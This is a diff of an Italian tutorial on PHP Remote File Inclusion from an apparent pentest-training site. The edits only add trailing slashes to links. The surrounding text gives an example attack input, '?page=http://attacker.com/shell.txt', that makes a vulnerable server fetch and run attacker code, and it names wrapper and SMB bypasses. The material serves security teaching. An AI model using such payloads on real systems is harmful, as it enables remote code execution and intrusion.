@@ -14,13 +14,13 @@ tags:
   - file-inclusion
 ---
 
-Se la [LFI](https://hackita.it/articoli/lfi) include file locali e li esegue, la **RFI** include file **remoti** — dal server dell'attaccante. L'applicazione PHP chiama `include($_GET['page'])`, l'attaccante inserisce `?page=http://attacker.com/shell.txt`, il server scarica `shell.txt` dal server dell'attaccante, lo interpreta come PHP, lo esegue. **RCE in un parametro URL.** Zero passaggi intermedi, zero log poisoning, zero upload — il server va a prendere il tuo codice e lo esegue da solo.
+Se la [LFI](https://hackita.it/articoli/lfi/) include file locali e li esegue, la **RFI** include file **remoti** — dal server dell'attaccante. L'applicazione PHP chiama `include($_GET['page'])`, l'attaccante inserisce `?page=http://attacker.com/shell.txt`, il server scarica `shell.txt` dal server dell'attaccante, lo interpreta come PHP, lo esegue. **RCE in un parametro URL.** Zero passaggi intermedi, zero log poisoning, zero upload — il server va a prendere il tuo codice e lo esegue da solo.
 
 L'unico ostacolo "teorico" è che PHP richiede `allow_url_include=On` per includere URL remote. Questa direttiva è disabilitata di default dal 2006. Fine della storia? No. Nel 2026 la trovo ancora attiva nel **3% dei server** — sistemi legacy, XAMPP/WAMP di sviluppo finiti in produzione, Docker image obsolete, misconfiguration. E anche quando è `Off`, ci sono **bypass**: `data://`, `php://input`, e su Windows il **vettore SMB** che non richiede affatto `allow_url_include`.
 
 La RFI pura la trovo nel **3% dei pentest**, ma sommando i bypass wrapper e SMB la superficie sale al **7%**. Quando funziona, è la vulnerabilità più rapida da sfruttare: **RCE in 30 secondi** dal primo test.
 
-Satellite operativo della [guida pillar File & Path Attacks](https://hackita.it/articoli/file-path-attacks-guida-completa).
+Satellite operativo della [guida pillar File & Path Attacks](https://hackita.it/articoli/file-path-attacks-guida-completa/).
 
 ## Cos'è la RFI?
 
@@ -652,6 +652,6 @@ if (isset($allowed[$page])) {
 
 ***
 
-Satellite della [Guida Completa File & Path Attacks](https://hackita.it/articoli/file-path-attacks-guida-completa). Vedi anche: [LFI](https://hackita.it/articoli/lfi), [Path Traversal](https://hackita.it/articoli/path-traversal), [SSRF](https://hackita.it/articoli/ssrf).
+Satellite della [Guida Completa File & Path Attacks](https://hackita.it/articoli/file-path-attacks-guida-completa/). Vedi anche: [LFI](https://hackita.it/articoli/lfi/), [Path Traversal](https://hackita.it/articoli/path-traversal/), [SSRF](https://hackita.it/articoli/ssrf/).
 
 > I tuoi parametri PHP accettano URL remote? `allow_url_include` è veramente Off? [Penetration test applicativo HackIta](https://hackita.it/servizi) per trovare ogni vettore RFI — inclusi SMB e wrapper bypass. Per padroneggiare l'exploitation dalla RFI al Domain Admin: [formazione 1:1](https://hackita.it/formazione).
